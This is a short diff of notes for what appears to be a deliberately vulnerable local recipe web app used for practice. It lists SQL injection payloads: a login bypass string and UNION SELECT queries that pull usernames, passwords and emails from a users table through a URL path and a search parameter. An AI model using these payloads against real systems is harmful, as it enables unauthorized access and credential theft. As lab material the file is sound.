@@ -3,4 +3,6 @@ User: admin' OR '1'='1
 Password: egal
 
 SQL UNION
-http://127.0.0.1:5000/rezept/999 UNION SELECT id, username, password, email_address, 'x', 'x' FROM bugusers
+http://127.0.0.1:5000/rezepte?search=%' UNION SELECT id, username, password, email_address, 'x', 'x' FROM bugusers -- -
+
+%' UNION SELECT id, username, password, email_address, 'x', 'x' FROM bugusers -- -
